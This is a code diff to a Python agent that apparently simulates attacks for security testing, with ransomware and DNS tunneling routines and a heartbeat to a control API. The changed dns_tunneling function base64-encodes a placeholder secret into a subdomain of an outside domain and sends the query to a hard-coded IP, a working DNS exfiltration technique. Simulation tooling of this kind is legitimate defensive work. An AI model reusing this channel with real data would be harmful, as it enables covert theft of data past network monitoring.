@@ -14,7 +14,10 @@ from math import floor
 from datetime import datetime, timedelta
 from cryptography.fernet import Fernet
 import glob 
-from scapy.all import DNS, DNSQR, IP, sr1, UDP
+# testing to see if cx_freeze can import scapy automatically like this
+from scapy.layers.inet import IP, UDP
+from scapy.layers.dns import DNS, DNSQR
+from scapy.sendrecv import sr1
 
 
 #Configurable Variables
@@ -379,18 +382,31 @@ def ransomware_simulation():
         logging_func("ransomware simulation error")
         return {"use_case": "ransomware_simulation", "status": f"error: {e}"}
 
+# Only works when doing calls to external url
 def dns_tunneling():
     logging_func("DNS tunneling simulation starting")
-    text = "testSuperSecretCode"
-    text_bytes = base64.urlsafe_b64encode(text.encode("ascii"))
-    text_str = text_bytes.decode("ascii")   
-    qname = f"{text_str}.dns.bitlus.online"
-    dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
-    answer = sr1(dns_req, verbose=1, timeout=5)
-    if answer:
-        answer.show()  # This prints the entire DNS response
-    else:
-        print("No response received.")
+    try:
+        text = "testSuperSecretCode"
+        text_bytes = base64.urlsafe_b64encode(text.encode("ascii"))
+        text_str = text_bytes.decode("ascii")   
+        qname = f"{text_str}.dns.bitlus.online"
+        dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
+        answer = sr1(dns_req, verbose=1, timeout=5)
+        if answer:
+            answer.show()  # This prints the entire DNS response
+            print(f"DNS Tunneling successful")
+            logging_func("DNS Tunneling successful")
+            return {"use_case": "dns_tunneling", "status": f"completed"}
+        else:
+            print("No response received.")
+            print(f"DNS Tunneling failed")
+            logging_func("DNS Tunneling failed")
+            return {"use_case": "dns_tunneling", "status": "failed", "error": "No repsonse from DNS server"}
+    except Exception as e:
+        print(f"Error in DNS Tunneling: {e}")
+        logging_func("DNS Tunneling Error")
+        return {"use_case": "dns_tunneling", "status": f"error{e}"}
+    
 
     # DNS_TUNNEL_API = f"{base_url}/api/dnstunneling"
     # try:
@@ -554,7 +570,7 @@ def heart_beat():
                 f"{base_url}/api/heartbeat",
                 json={"host_name": hostname, "api_key":API_KEY},
             )
-            print(response.raw)
+            # print(response.raw)
             
             if response.status_code == 200:
                 #print(response.json().get("message"))
@@ -604,7 +620,6 @@ if __name__ == "__main__":
 
         # Step 2: Send aggregated logs to the API
         data_to_send(payload)
-
 
         # Step 3: Enter heartbeat monitoring
         heart_beat()
